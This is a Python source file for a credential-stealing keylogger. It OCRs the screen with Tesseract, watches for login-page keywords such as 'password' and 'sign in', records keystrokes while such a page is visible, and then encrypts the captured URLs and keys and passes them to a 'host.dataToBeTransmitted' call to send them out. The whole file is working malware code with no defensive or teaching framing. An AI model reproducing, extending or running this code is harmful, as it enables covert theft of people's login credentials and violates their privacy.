import pytesseract
import cv2
import numpy as np
import mss
import re
import keyboard
import encryptor
import host

flag = False
keys = []

# Configure Tesseract executable path
pytesseract.pytesseract.tesseract_cmd = r"C:\path\to\tesseract.exe"

# all the print statements are for testing purposes
def capture_screen():
    with mss.mss() as sct:
        return pytesseract.image_to_string(cv2.cvtColor(cv2.cvtColor(np.array(sct.grab(sct.monitors[1])), cv2.COLOR_BGRA2BGR), cv2.COLOR_BGR2GRAY))


def find_login_keywords(text):
    keywords = ["login", "sign in", "username", "password", "email", "e-mail"]
    text = text.lower()
    for keyword in keywords:
        if re.search(rf'\b{keyword.lower()}\b', text, re.IGNORECASE):
            return True
    return False


def extract_url(text):
    # Look for something that looks like a URL
    urls = re.findall(r'\b(?:http[s]?://)?(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b', text)

    valid_tlds = ['com', 'org', 'net', 'edu', 'gov', 'io', 'ai', 'co',] # add more TLDs if necessary
    return set([url for url in urls if any(url.endswith('.' + tld) for tld in valid_tlds)])


def on_key_press(event):
    global flag
    if flag:
        keys.append(event.name)
        # print(f'key pressed {event.name}')


keyboard.on_press(on_key_press)


def monitor_login_pages():
    urls = {}
    global flag
    while True:
        text = capture_screen()
        # print(text)

        match = find_login_keywords(text)
        if match:
            valid_urls = extract_url(text)
            urls = valid_urls
            # print(f"Login page detected!")
            if not flag:
                flag = True
                # print('Keylogger is off. Turning on!!')

        else:
            if flag is True:
                flag = False
                # print('Keylogger turned off.')
                # print(f"url: {urls}, keys:{keys}")
                encryptedMessage = encryptor.encrypt(f"url: {urls}, keys:{keys}")
                # print(encryptedMessage[1] + encryptedMessage[0])
                host.dataToBeTransmitted(encryptedMessage[1] + encryptedMessage[0])
                keys.clear()


monitor_login_pages()
